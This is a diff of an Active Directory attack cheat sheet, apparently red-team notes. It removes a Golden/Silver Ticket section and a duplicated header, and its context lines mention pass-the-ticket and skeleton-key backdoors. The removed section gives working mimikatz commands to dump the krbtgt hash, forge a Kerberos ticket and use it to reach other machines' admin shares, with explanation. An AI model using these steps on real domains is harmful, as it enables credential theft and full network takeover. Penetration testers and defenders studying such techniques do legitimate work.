@@ -25,42 +25,6 @@ Informational:
   ticket and then impersonate that ticket using mimikatz PTT attack allowing you 
   to act as that domain admin.
 
-##################### Golden/Silver Ticket Attack #####################
-Dump the krbtgt hash:
-  cd downloads && mimikatz.exe 
-                 Navigate to the directory mimikatz is in and run mimikatz
-  privilege::debug
-                 Ensure this outputs [privilege '20' ok]
-  lsadump::lsa /inject /name:krbtgt
-                 Dump the hash as well as the security identifier needed to create
-                 a Golden Ticket. To create a silver ticket you need to change the
-                 /name: to dump the hash of either a domain admin account or a
-                 service account such as the SQLService account.
-
-Create a Golden/Silver Ticket:
-  Kerberos::golden /user:Administrator /domain:<DOMAIN>.local /sid:<SID> /krbtgt:<NTLM_HASH> /id:500
-                 Create a golden ticket to create a silver ticket simply put a service
-                 NTLM hash into the krbtgt slot, the sid of the service account into
-                 sid, and change the id to 1103.
-
-Use the Golden/Silver Ticket to access other machines:
-  misc::cmd      Open a new elevated command prompt with the given ticket in mimikatz
-  dir \\DESKTOP-1\c$
-                 Access machines that you want
-
-Informational:
-  A golden ticket attack works by dumping the ticket-granting ticket of any user on
-  the domain this would preferably be a domain admin however for a golden ticket
-  you would dump the krbtgt ticket and for a silver ticket, you would dump any
-  service or domain admin ticket. You then use these details inside of a mimikatz 
-  golden ticket attack in order to create a TGT that impersonates the given service
-  account information
-  What you can access after creating a ticket will depend on the privileges
-  of the user that you decided to take the ticket from however if you took the ticket
-  from krbtgt you have access to the ENTIRE network hence the name golden ticket;
-  however, silver tickets only have access to those that the user has access to if
-  it is a domain admin it can almost access the entire network however it is slightly 
-  less elevated from a golden ticket.
 
 ##################### Skeleton Key Backdoor #####################
 Preparing Mimikatz:
@@ -87,5 +51,3 @@ Informational:
   to any of the machines with a master password. 
   The skeleton key will not persist by itself because it runs in the memory, 
   but it can be scripted or persisted using other tools and techniques.
-
-##################### Skeleton Key Backdoor #####################
